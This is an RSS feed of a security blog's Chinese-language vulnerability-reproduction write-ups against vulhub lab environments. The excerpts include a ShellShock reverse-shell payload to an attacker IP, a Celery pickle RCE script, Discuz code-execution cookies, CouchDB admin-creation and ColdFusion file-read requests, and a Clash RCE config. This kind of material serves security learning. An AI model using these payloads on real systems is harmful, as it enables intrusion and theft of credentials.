@@ -1,0 +1,295 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>漏洞复现 on 0opsdc</title>
+    <link>https://oopsdc.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+    <description>Recent content in 漏洞复现 on 0opsdc</description>
+    <image>
+      <url>https://oopsdc.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</url>
+      <link>https://oopsdc.com/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sat, 19 Mar 2022 17:38:55 +0800</lastBuildDate><atom:link href="https://oopsdc.com/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Django JSONField SQL注入 CVE 2019 14234漏洞复现</title>
+      <link>https://oopsdc.com/post/django-jsonfield-sql%E6%B3%A8%E5%85%A5-cve-2019-14234%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sat, 19 Mar 2022 17:38:55 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/django-jsonfield-sql%E6%B3%A8%E5%85%A5-cve-2019-14234%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 Django是一个由Python编写的开源Web框架，采用MTV框架模式。
+该漏洞需要开发者使用JSONField/HStoreField且用户可控queryset查询时的键名，在键名的位置实现SQL注入。
+Django通常结合PostgreSQL数据库进行使用，而JSONField是该数据库的一种数据类型，漏洞成因在于Django中JSONField类的实现，Django的model的本质作用在于生成SQL语句，但Django在通过JSONField生成SQL语句时仅通过简单字符串拼接，通过JSONField类获得KeyTransform类并生成SQL语句：
+class KeyTransform(Transdform): operator = &amp;#39;-&amp;gt;&amp;#39; nested_operator = &amp;#39;#&amp;gt;&amp;#39; def __init__(self, key_name, *args, **kwargs): super().__init__(*args, **kwargs) self.key_name = key_name def as_sql(self, compiler, connection): key_transforms = [self.key_name] previous.= self.lhs while isinstance(previous, KeyTransform): key_transforms.insert(0, previous.key_name) previous = previous.lhs lhs, params = compiler.compile(previous) if len(key_transforms) &amp;gt; 1: return &amp;#34;(%s %s %%s)&amp;#34; % (lhs, self.nested_operator), [key_transforms] + params try: int(self.key_name) except ValueError: lookup = &amp;#34;&amp;#39;%s&amp;#39;&amp;#34; % self.key_name else: lookup = &amp;#34;%s&amp;#34; % self.</description>
+    </item>
+    
+    <item>
+      <title>Django URL跳转 CVE-2018-14574漏洞复现</title>
+      <link>https://oopsdc.com/post/django-url%E8%B7%B3%E8%BD%AC-cve-2018-14574%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Wed, 16 Mar 2022 19:39:54 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/django-url%E8%B7%B3%E8%BD%AC-cve-2018-14574%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 当setting中配置了django.middleware.common.CommonMiddleware且APPEND_SLASH=True时会触发URL跳转漏洞，而这两个配置默认存在，且APPEND_SLASH不需显式写在setting配置文件。CommonMiddleware是Django的一个通用中间件，其实质是一个位于site-packages/django/middleware/common.py的类，用于执行一些HTTP请求的基础操作：
+- Forbid access to User-Agents in settings.DISALLOWED_USER_AGENTS - URL rewriting: Based on the APPEND_SLASH and PREPEND_WWW settings, append missing slashes and/or prepends missing &amp;#34;www.&amp;#34;s. - If APPEND_SLASH is set and the initial URL doesn&amp;#39;t end with a slash, and it is not found in urlpatterns, form a new URL by appending a slash at the end. If this new URL is found in urlpatterns, return an HTTP redirect to this new URL; otherwise process the initial URL as usual.</description>
+    </item>
+    
+    <item>
+      <title>Clash for Windows RCE漏洞复现</title>
+      <link>https://oopsdc.com/post/clash-for-windows-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Wed, 16 Mar 2022 18:38:09 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/clash-for-windows-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 [Bug]: Remote Code Execution/远程代码执行 · Issue #2710 · Fndroid/clash_for_windows_pkg (github.com)
+影响版本 Clash for Windows 0.19.9版本受部分影响。
+Clash for Windows 0.19.8及以下版本均受RCE影响。
+漏洞复现 POC:
+port: 7890 socks-port: 7891 allow-lan: true mode: Rule log-level: info external-controller: :9090 proxies: - name: a&amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(`require(&amp;#34;child_process&amp;#34;).exec(&amp;#34;calc.exe&amp;#34;);`);&amp;gt; type: socks5 server: 127.0.0.1 port: &amp;#34;17938&amp;#34; skip-cert-verify: true - name: abc type: socks5 server: 127.0.0.1 port: &amp;#34;8088&amp;#34; skip-cert-verify: true proxy-groups: - name: &amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(`require(&amp;#34;child_process&amp;#34;).exec(&amp;#34;calc.exe&amp;#34;);`);&amp;gt; type: select proxies: - a&amp;lt;img/src=&amp;#34;1&amp;#34;/onerror=eval(`require(&amp;#34;child_process&amp;#34;).exec(&amp;#34;calc.exe&amp;#34;);`);&amp;gt; Clash for Windows下载地址：Releases · Fndroid/clash_for_windows_pkg (github.</description>
+    </item>
+    
+    <item>
+      <title>Django Debug Page XSS CVE-2017-12794漏洞复现</title>
+      <link>https://oopsdc.com/post/django-debug-page-xss-cve-2017-12794%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Wed, 23 Feb 2022 17:01:40 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/django-debug-page-xss-cve-2017-12794%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞原理 若Django项目使用Postgres作为数据库，当触发异常时，psycopg会将字段名及字段值抛出，当字段值中包含可控字符串时，其最后便会在页面中进行显示。
+我们可查看1.11.4和1.11.5版本之间django/views/templates/technical_500.html文件的差异：
+其差异在于外部关闭了全局转义，并在如图所示处增加了强制转义。若要触发这两个输出点，我们需要进入{% ifchanged frame.exc_cause %}{% if frame.exc_cause %}语句，那么就需要我们判断这段代码所在的功能点，然后精准打击，图中有一串The above exception was the direct cause of the following exception:报错提示，而依据经验的话这是Django中数据库异常抛出的错误语句。
+在Django命令行下，当创建一个已存在的用户时，系统会因触发数据库Unique异常而抛出一个IntegrityError异常，其目的在于方便开发者进行SQL错误调试。
+查看django/db/utils.py的__exit__函数：
+def __exit__(self, exc_type, exc_value, traceback): if exc_type is None: return for dj_exc_type in ( DataError, OperationalError, IntegrityError, InternalError, ProgrammingError, NotSupportedError, DatabaseError, InterfaceError, Error, ): db_exc_type = getattr(self.wrapper.Database, dj_exc_type.__name__) if issubclass(exc_type, db_exc_type): dj_exc_value = dj_exc_type(*exc_value.args) dj_exc_value.__cause__ = exc_value if not hasattr(exc_value, &amp;#39;__traceback__&amp;#39;): exc_value.__traceback__ = traceback # Only set the &amp;#39;errors_occurred&amp;#39; flag for errors that may make # the connection unusable.</description>
+    </item>
+    
+    <item>
+      <title>Discuz!X≤3.4任意文件删除漏洞复现</title>
+      <link>https://oopsdc.com/post/discuzx3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Mon, 21 Feb 2022 21:06:42 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/discuzx3.4%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 Discuz 3.4版本之前的任意文件删除漏洞未被完全修复，虽然添加了对属性formtype的判断，但仍可通过模拟文件上传进入其它unlink条件，实现任意文件删除。
+影响版本 Discuz 3.4及以下版本。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/discuz/x3.4-arbitrary-file-deletion docker-compose up -d 环境启动之后直接访问http://&amp;lt;ip&amp;gt;:8080会显示Discuz! info: Can not connect to MySQL server错误，需要先在http://&amp;lt;ip&amp;gt;:8080/install页面安装Discuz，数据库地址填写为db，数据库及管理员密码自行填写即可：
+访问http://&amp;lt;ip&amp;gt;/robots.txt查看robots.txt文件是否存在，文件存在且内容如下：
+# # robots.txt for Discuz! X3 # User-agent: * Disallow: /api/ Disallow: /data/ Disallow: /source/ Disallow: /install/ Disallow: /template/ Disallow: /config/ Disallow: /uc_client/ Disallow: /uc_server/ Disallow: /static/ Disallow: /admin.php Disallow: /search.php Disallow: /member.php Disallow: /api.php Disallow: /misc.php Disallow: /connect.php Disallow: /forum.php?mod=redirect* Disallow: /forum.php?mod=post* Disallow: /home.php?mod=spacecp* Disallow: /userapp.</description>
+    </item>
+    
+    <item>
+      <title>Celery&lt;4.0未授权访问&amp;Pickle反序列化利用漏洞复现</title>
+      <link>https://oopsdc.com/post/celery4.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sat, 19 Feb 2022 21:24:53 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/celery4.0%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEpickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 Celery是一个简单、灵活、可靠的分布式系统，用于处理大量消息的同时也为操作提供维护此类系统所需的工具，其专注于实时处理的任务队列，支持任务调度。
+Celery 4.0以下版本默认使用Pickle进行任务消息的序列化传递，而当所用队列服务(Redis、RabbitMQ、RocketMQ等)存在未授权访问问题时，便可利用Pickle反序列化漏洞实现任意代码执行。
+影响版本 Celery 4.0以下版本。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/celery/celery3_redis_unauth docker-compose up -d 在受害主机/tmp目录生成celery_success文件EXP，可根据需求自行修改command内容：
+import pickle import json import base64 import redis import sys r = redis.Redis(host=sys.argv[1], port=6379, decode_responses=True,db=0) ori_str=&amp;#34;{\&amp;#34;content-type\&amp;#34;: \&amp;#34;application/x-python-serialize\&amp;#34;, \&amp;#34;properties\&amp;#34;: {\&amp;#34;delivery_tag\&amp;#34;: \&amp;#34;16f3f59d-003c-4ef4-b1ea-6fa92dee529a\&amp;#34;, \&amp;#34;reply_to\&amp;#34;: \&amp;#34;9edb8565-0b59-3389-944e-a0139180a048\&amp;#34;, \&amp;#34;delivery_mode\&amp;#34;: 2, \&amp;#34;body_encoding\&amp;#34;: \&amp;#34;base64\&amp;#34;, \&amp;#34;delivery_info\&amp;#34;: {\&amp;#34;routing_key\&amp;#34;: \&amp;#34;celery\&amp;#34;, \&amp;#34;priority\&amp;#34;: 0, \&amp;#34;exchange\&amp;#34;: \&amp;#34;celery\&amp;#34;}, \&amp;#34;correlation_id\&amp;#34;: \&amp;#34;6e046b48-bca4-49a0-bfa7-a92847216999\&amp;#34;}, \&amp;#34;headers\&amp;#34;: {}, \&amp;#34;content-encoding\&amp;#34;: \&amp;#34;binary\&amp;#34;, \&amp;#34;body\&amp;#34;: \&amp;#34;gAJ9cQAoWAMAAABldGFxAU5YBQAAAGNob3JkcQJOWAQAAABhcmdzcQNLZEvIhnEEWAMAAAB1dGNxBYhYBAAAAHRhc2txBlgJAAAAdGFza3MuYWRkcQdYAgAAAGlkcQhYJAAAADZlMDQ2YjQ4LWJjYTQtNDlhMC1iZmE3LWE5Mjg0NzIxNjk5OXEJWAgAAABlcnJiYWNrc3EKTlgJAAAAdGltZWxpbWl0cQtOToZxDFgGAAAAa3dhcmdzcQ19cQ5YBwAAAHRhc2tzZXRxD05YBwAAAHJldHJpZXNxEEsAWAkAAABjYWxsYmFja3NxEU5YBwAAAGV4cGlyZXNxEk51Lg==\&amp;#34;}&amp;#34; task_dict = json.loads(ori_str) command = &amp;#39;touch /tmp/celery_success&amp;#39; class Person(object): def __reduce__(self): # 未导入os模块，通用 return (__import__(&amp;#39;os&amp;#39;).</description>
+    </item>
+    
+    <item>
+      <title>Discuz代码执行 Wooyun-2010-080723漏洞复现</title>
+      <link>https://oopsdc.com/post/discuz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-wooyun-2010-080723%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Fri, 18 Feb 2022 12:48:42 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/discuz%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C-wooyun-2010-080723%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 PHP 5.3.x版本php.ini配置文件中request_order参数的默认值为GP，导致$_REQUEST不再包含$_COOKIE，攻击者可通过Cookie传入$GLOBALS覆盖全局变量，进一步实现代码执行。
+影响版本 Discuz 6.x版本。
+Discuz 7.x版本。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/discuz/wooyun-2010-080723 docker-compose up -d 环境启动之后直接访问http://&amp;lt;ip&amp;gt;:8080会显示Discuz! info: Can not connect to MySQL server错误，需要先在http://&amp;lt;ip&amp;gt;:8080/install页面安装Discuz，数据库地址填写为db，数据库及管理员密码自行填写即可：
+随机抓一个帖子的数据包：
+GET /viewthread.php?tid=13&amp;amp;extra=page%3D1 HTTP/1.1 Host: &amp;lt;ip&amp;gt; Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://&amp;lt;ip&amp;gt;/forumdisplay.php?fid=2 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Cookie: CFADMIN_LASTPAGE_ADMIN=%2FCFIDE%2Fadministrator%2Fhomepage%2Ecfm; 8p0_sid=uUasIs; 8p0_onlineusernum=1; 8p0_visitedfid=2; 8p0_oldtopics=D13D; 8p0_fid2=1645160609 Connection: close 将包发送到重放器，修改Cookie：
+GLOBALS[_DCACHE][smilies][searcharray]=/.*/eui; GLOBALS[_DCACHE][smilies][replacearray]=phpinfo(); 发包后查看响应，成功返回phpinfo页面，同理可写shell，文件x.php，密码oopsdc：</description>
+    </item>
+    
+    <item>
+      <title>Apache CouchDB垂直越权 CVE-2017-12635漏洞复现</title>
+      <link>https://oopsdc.com/post/apache-couchdb%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-cve-2017-12635%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Tue, 15 Feb 2022 13:19:33 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/apache-couchdb%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-cve-2017-12635%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 Apache CouchDB是一个开源数据库，其使用JSON作为数据存储格式、JavaScript作为查询语言、MapReduce和HTTP作为NoSQL数据库。
+漏洞成因在于Erlang和JavaScript对JSON数据解析方式不同，对于重复的键，Erlang会存储两个值，而JavaScript只存储第二个值，从而导致语句执行有差异，可被攻击者用于垂直越权。
+示例：
+Erlang：
+jiffy:decode(&amp;#34;{&amp;#34;a&amp;#34;:&amp;#34;1&amp;#34;,&amp;#34;a&amp;#34;:&amp;#34;2&amp;#34;}&amp;#34;). {[{&amp;lt;&amp;lt;&amp;#34;a&amp;#34;&amp;gt;&amp;gt;,&amp;lt;&amp;lt;&amp;#34;1&amp;#34;&amp;gt;&amp;gt;},{&amp;lt;&amp;lt;&amp;#34;a&amp;#34;&amp;gt;&amp;gt;,&amp;lt;&amp;lt;&amp;#34;2&amp;#34;&amp;gt;&amp;gt;}]} JavaScript：
+JSON.parse(&amp;#34;{&amp;#34;a&amp;#34;:&amp;#34;1&amp;#34;,&amp;#34;a&amp;#34;:&amp;#34;2&amp;#34;}&amp;#34;) {a:&amp;#34;2&amp;#34;} 影响版本 1.7.0、2.1.1版本以下均受影响。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/couchdb/CVE-2017-12635 docker-compose up -d 访问http://&amp;lt;ip&amp;gt;:5984/_utils，会跳转到登录页面，使用bp构造如下请求包：
+PUT /_users/org.couchdb.user:oopsdc HTTP/1.1 Host: &amp;lt;ip&amp;gt;:5984 Content-Length: 92 accept: application/json User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Content-Type: application/x-www-form-urlencoded;charset=UTF-8 Origin: http://&amp;lt;ip&amp;gt;:5984 Referer: http://&amp;lt;ip&amp;gt;:5984/_utils/ Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 { &amp;#34;type&amp;#34;: &amp;#34;user&amp;#34;, &amp;#34;name&amp;#34;: &amp;#34;oopsdc&amp;#34;, &amp;#34;roles&amp;#34;:[ &amp;#34;_admin&amp;#34;], &amp;#34;password&amp;#34;: &amp;#34;oopsdc&amp;#34; } 响应包如下：
+HTTP/1.1 403 Forbidden X-CouchDB-Body-Time: 0 X-Couch-Request-ID: 4ab931d550 Server: CouchDB/2.</description>
+    </item>
+    
+    <item>
+      <title>Adobe ColdFusion反序列化 CVE-2017-3066漏洞复现</title>
+      <link>https://oopsdc.com/post/adobe-coldfusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-2017-3066%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Thu, 27 Jan 2022 19:40:58 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/adobe-coldfusion%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-cve-2017-3066%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 Adobe ColdFusion是一个动态Web服务器，其所采用的CFML(ColdFusion Markup Language)程序设计语言类似JSP的JSTL(JSP Standard Tag Lib)，CFML是一种针对Web应用的脚本语言，文件后缀为.cfm。
+Adobe ColdFusion存在Java反序列化漏洞，攻击者可通过该漏洞在应用程序上下文中执行任意代码或造成拒绝服务。
+影响版本 Adobe ColdFusion(2016 release) Update 3及之前版本。
+Adobe ColdFusion 11 Update 11及之前版本。
+Aodbe ColdFusion 10 Update 22及之前版本。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/coldfusion/CVE-2017-3066 docker-compose up -d 访问链接http://&amp;lt;ip&amp;gt;:8500/，显示页面无法展示，还有一个大的404头像。
+访问http://&amp;lt;IP&amp;gt;:8500/CFIDE/administrator/index.cfm，默认密码为vulhub，然后有一个初始化成功页面。
+利用工具：
+Releases · codewhitesec/ColdFusionPwn (github.com)
+https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
+生成poc.ser：
+java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-master-SNAPSHOT.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &amp;#39;ping oopsdc.zzn11a.dnslog.cn&amp;#39; poc.ser 然后抓取访问http://&amp;lt;ip&amp;gt;:8500/flex2gateway/amf的数据包，请求方式更改为POST，Content-Type更改为application/x-amf，在最后面选择从文件中复制，然后将poc.ser文件内容粘贴到请求中，点击转发包，查看dnslog记录即可。
+文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>Adobe ColdFusion文件读取 CVE-2010-2861漏洞复现</title>
+      <link>https://oopsdc.com/post/adobe-coldfusion%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2010-2861%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Thu, 27 Jan 2022 18:58:35 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/adobe-coldfusion%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96-cve-2010-2861%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 Adobe ColdFusion是一个动态Web服务器，其所采用的CFML(ColdFusion Markup Language)程序设计语言类似JSP的JSTL(JSP Standard Tag Lib)，CFML是一种针对Web应用的脚本语言，文件后缀为.cfm。
+Adobe ColdFusion 8及Adobe ColdFusion 9版本存在目录穿越漏洞，攻击者可在未授权的情况下读取任意文件。
+影响版本 Adobe ColdFusion 8、Adobe ColdFusion 9。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/coldfusion/CVE-2010-2861 docker-compose up -d 访问http://&amp;lt;ip&amp;gt;:8500/CFIDE/administrator/enter.cfm页面，默认密码为admin，登录成功之后会有一个初始化成功页面。
+之后的文件读取步骤可能会因为URL编码或Cookie无法成功，所以用bp进行包重放。
+读取系统用户信息：
+GET /CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en HTTP/1.1 Host: &amp;lt;ip&amp;gt;:8500 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 Connection: close 读取管理员密码：
+GET /CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en HTTP/1.1 Host: &amp;lt;ip&amp;gt;:8500 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.</description>
+    </item>
+    
+    <item>
+      <title>HTTPoxy CVE-2016-5385漏洞复现</title>
+      <link>https://oopsdc.com/post/httpoxy-cve-2016-5385%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sun, 16 Jan 2022 11:20:48 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/httpoxy-cve-2016-5385%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 漏洞原理在CGI变量命名不规范，CGI程序在接收到HTTP Header后会将部分Header信息存在HTTP_开头的变量中。但CGI程序环境变量本身已经定义了HTTP_PROXY变量，旨在为CGI程序设置代理，如果攻击者在请求中带上了Proxy头，则已定义的HTTP_PROXY变量将被覆盖，实现当前请求的变量劫持，并不会对全局变量造成影响。
+所以其本质在于CGI环境变量劫持，如果CGI程序在运行过程中依赖HTTP_PROXY变量，则攻击者可获取敏感数据或伪造返回包对CGI程序进行欺骗。
+影响版本 任何以CGI方式运行的程序，但需满足以下三点条件：
+CGI程序对外发送请求； CGI程序依赖HTTP_PROXY变量； CGI程序与外部使用HTTP协议进行通信。 漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/cgi/httpoxy docker-compose up -d 抓取访问包：
+GET /index.php HTTP/1.1 Host: &amp;lt;ip&amp;gt;:8080 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: en-US,en;q=0.9 If-None-Match: &amp;#34;61cb2d26-267&amp;#34; If-Modified-Since: Tue, 28 Dec 2021 15:28:38 GMT Connection: close 响应包：
+HTTP/1.1 200 OK Server: nginx/1.21.5 Date: Sun, 16 Jan 2022 06:35:17 GMT Content-Type: application/json; charset=utf-8 Connection: close X-Powered-By: PHP/5.</description>
+    </item>
+    
+    <item>
+      <title>ShellShock CVE-2014-6271漏洞复现</title>
+      <link>https://oopsdc.com/post/shellshock-cve-2014-6271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Wed, 29 Dec 2021 18:24:13 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/shellshock-cve-2014-6271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 ShellShock是一个BashShell漏洞，通常情况下系统内的Shell有严格权限控制，但GNU Bash在 4.3及之前版本存在安全漏洞，Bash运行过程中会调用操作系统的环境变量，攻击者可向环境变量值内的函数定义后添加多余字符串触发漏洞，通过改变或绕过环境限制来执行Shell命令。
+Bash使用的环境变量通过函数名称进行调用，漏洞原因在于以(){开头定义的环境变量在命令ENV中解析为函数后，Bash执行并未退出，而是继续解析并执行Shell命令，攻击者可借此实现反弹Shell等行为。
+漏洞的核心原因在于输入过滤中没有严格的限制边界，没有做合法化的参数判断。
+影响版本 GNU Bash 4.3及之前版本。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/bash/shellshock docker-compose up -d 环境启动后可尝试访问http://&amp;lt;ip&amp;gt;:&amp;lt;port&amp;gt;/victim.cgi查看是否启动成功。
+攻击机监听端口：
+nc -lvnp &amp;lt;port&amp;gt; 抓取当前页面的访问数据包，修改User-Agent构造一个反弹Shell的payload：
+User-Agent:() { :; }; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;ip&amp;gt;/&amp;lt;port&amp;gt; 0&amp;gt;&amp;amp;1; 成功反弹Shell。
+漏洞分析 复现目录下存在safe.cgi和victim.cgi两个cgi文件，我们使用diff命令看看两者的差异：
+# 命令 diff safe.cgi victim.cgi # 结果 1c1 &amp;lt; #!/bin/bash --- &amp;gt; #!/usr/local/bash-4.3.0/bin/bash # 输出信息讲解 1c1：表示第一个文件的第1行与第二个文件的第1行不匹配 &amp;lt;：表示第一个文件中的数据行 &amp;gt;：表示第二个文件中的数据行 可以发现两者Bash版本不同，而在访问http://&amp;lt;ip&amp;gt;:&amp;lt;port&amp;gt;/safe.cgi时，漏洞无法复现成功。
+Web服务器通过环境变量获取浏览器参数，然后交给CGI程序，环境中的CGI程序是有漏洞版本的Bash生成的，因此在HTTP头部中注入的浏览器参数被Bash当作环境变量解析并执行了。
+文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>AppWeb认证绕过 CVE-2018-8715漏洞复现</title>
+      <link>https://oopsdc.com/post/appweb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-cve-2018-8715%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sat, 25 Dec 2021 20:57:15 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/appweb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87-cve-2018-8715%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 AppWeb使用以下三种认证方式：
+认证方式 认证原理 basic 传统HTTP基础认证 digest 改良版HTTP基础认证，认证通过后不再传递Authorization头，而使用Cookie保存状态 form 表单认证 在7.0.3之前版本，若认证方式为digest或form，此时攻击者可通过不传递密码参数，利用AppWeb逻辑错误成功认证并获取session。
+AppWeb使用C/C++语言进行编写，是Embedthis Software LLC公司开发维护的一个基于GPL开源协议的嵌入式Web Server，主要应用场景在于为嵌入式设备提供Web Application容器。
+影响版本 AppWeb 7.0.3之前版本。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/appweb/CVE-2018-8715 docker-compose up -d 访问http://&amp;lt;ip&amp;gt;:&amp;lt;port&amp;gt;，会弹出一个登录框，此时需要输入一个存在的用户名，猜测为admin，密码随意输入，抓取登录包并构造Authorization: Digest username=admin，点击发送，成功绕过认证。
+文章许可：本文采用CC BY-NC-SA 4.0许可协议，转载请注明出处。</description>
+    </item>
+    
+    <item>
+      <title>Apereo CAS RCE漏洞复现</title>
+      <link>https://oopsdc.com/post/apereo-cas-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
+      <pubDate>Sat, 25 Dec 2021 12:00:00 +0800</pubDate>
+      
+      <guid>https://oopsdc.com/post/apereo-cas-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
+      <description>漏洞描述 Apereo CAS是2002年耶鲁大学实验室推出的一个开源统一认证服务，CAS即Central Authentication Service，其漏洞成因在于Webflow中使用了默认密钥changeit，攻击者可通过默认密钥触发反序列化漏洞，实现RCE。
+影响版本 Apereo CAS 4.1.x ~ 4.1.6。
+漏洞复现 git clone https://github.com/vulhub/vulhub.git cd vulhub/apereo-cas/4.1-rce docker-compose up -d 利用工具：vulhub/Apereo-CAS-Attack: WIP: Demo for Attacking Apereo CAS (github.com)
